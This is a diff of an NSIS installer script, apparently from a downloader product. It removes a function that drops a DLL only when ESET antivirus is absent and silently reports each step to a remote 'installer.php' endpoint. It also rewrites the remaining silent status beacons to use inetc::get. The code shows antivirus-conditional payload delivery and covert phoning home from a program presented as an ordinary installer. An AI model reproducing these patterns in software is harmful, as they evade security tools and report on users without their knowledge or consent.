@@ -103,24 +103,6 @@ done2:
 	${endif}
 	Push $EsetFound
 FunctionEnd
-Function InitDll
-	
-	StrCpy $ReportUrl "https://$MainDomain/installer.php?CODE=PUTGQ&UID=$1&action="
-	StrCpy $Result "2080"
-	Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
-	Pop $0
-	Pop $stack
-	
-	StrCpy $DllPath "$PLUGINSDIR"
-	
-	${if} $EsetFound == "false"
-		File /oname=$PLUGINSDIR\${utilites}.dll		"D:\Regular.Downloader\AutoCompile\Source\${utilites}.dll"
-	${endif}
-	StrCpy $Result "2081"
-	Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
-	Pop $0
-	Pop $stack
-FunctionEnd
 
 
 Function CheckDlls
@@ -130,12 +112,12 @@ Function CheckDlls
 	Pop $0
 	${if} $0 == "ok"
 		StrCpy $Result "2071"
-		Banner::get /NOUNLOAD /TOSTACK /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
+		inetc::get /NOUNLOAD /TOSTACK /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
 		Pop $0
 		Pop $stack
 	${else}
 		StrCpy $Result "2072"
-		Banner::get /NOUNLOAD /TOSTACK /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
+		inetc::get /NOUNLOAD /TOSTACK /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
 		Pop $0
 		Pop $stack
 	${endif}
